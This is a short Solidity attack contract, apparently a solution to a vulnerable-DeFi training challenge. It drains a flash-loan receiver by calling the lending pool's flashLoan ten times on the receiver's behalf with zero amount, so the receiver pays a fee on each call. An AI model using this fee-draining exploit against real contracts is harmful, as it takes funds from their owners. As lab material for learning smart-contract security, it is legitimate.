// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./FlashLoanReceiver.sol";
import "./NaiveReceiverLenderPool.sol";

contract AttackContract {

    FlashLoanReceiver receiver;
    NaiveReceiverLenderPool pool;

    constructor(address _receiver, address _pool) {
        receiver = FlashLoanReceiver(payable(_receiver));
        pool = NaiveReceiverLenderPool(payable(_pool)); 
    }

    function attack() public {
        for(uint256 i = 0; i < 10; i++) {
            pool.flashLoan(address(receiver), 0);
        }
    }

}